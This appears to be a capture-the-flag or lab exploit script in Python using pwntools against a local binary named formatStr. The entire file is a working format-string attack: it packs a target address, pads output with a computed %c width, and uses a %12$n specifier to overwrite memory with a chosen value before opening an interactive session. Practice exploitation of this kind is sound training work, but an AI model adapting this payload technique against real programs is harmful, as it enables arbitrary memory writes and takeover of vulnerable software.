from pwn import *

p = process("./formatStr")
# p = gdb.debug('./formatStr', 'b main')

target = 0x804c028
val = 0x01025544
payload = p32(target) + b"%" +  str((val-4)).encode() + b"c" + b"%12$n"

p.sendline(payload)
p.recvline()

p.interactive()
